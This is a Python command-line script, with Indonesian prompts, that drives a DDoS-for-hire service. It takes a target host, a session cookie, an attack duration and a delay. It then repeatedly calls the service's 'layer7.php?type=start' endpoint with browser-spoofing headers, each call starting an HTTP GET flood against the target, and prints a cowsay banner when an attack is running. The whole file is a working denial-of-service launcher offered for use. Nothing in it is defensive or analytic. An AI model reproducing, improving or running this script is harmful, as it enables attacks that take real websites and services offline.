import requests
import time
import cowsay
from tqdm import tqdm
import sys

def slow_print(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def get_input(prompt):
    slow_print(prompt, 0.05)
    return input()

def animate_cowsay(message):
    for _ in tqdm(range(100), desc="Processing", ncols=75):
        time.sleep(0.01)
    cowsay.cow(message)

def main():
    # Prompt user for name, host URL, cookie, attack time, and delay
    name = get_input("Masukkan nama: ")
    host = get_input("Masukkan URL host: ")
    cookie = get_input("Masukkan cookie: ")
    attack_time = int(get_input("Masukkan waktu (dalam detik) untuk serangan: "))
    delayt = int(get_input("Masukkan jeda (dalam detik) antar request: "))

    # Update the headers with the user-provided cookie
    headers = {
        "Cookie": cookie,
        "Sec-Ch-Ua": '"Chromium";v="125", "Not.A/Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://ddoser.vip/hub",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }

    url = f"https://ddoser.vip/complexx/layer7.php?type=start&host={host}&port=443&time={attack_time}&method=HTTPGET&totalservers=1&vip=undefined"

    while True:
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                message = f"Copyright © mnytc\nNama: {name}\nHost: {host}\nSudah Berjalan..."
                animate_cowsay(message)
            else:
                slow_print(f"Error: {response.status_code}")
        except Exception as e:
            slow_print(f"Terjadi kesalahan: {e}")
        time.sleep(delayt)  # Delay sesuai input pengguna

if __name__ == "__main__":
    main()
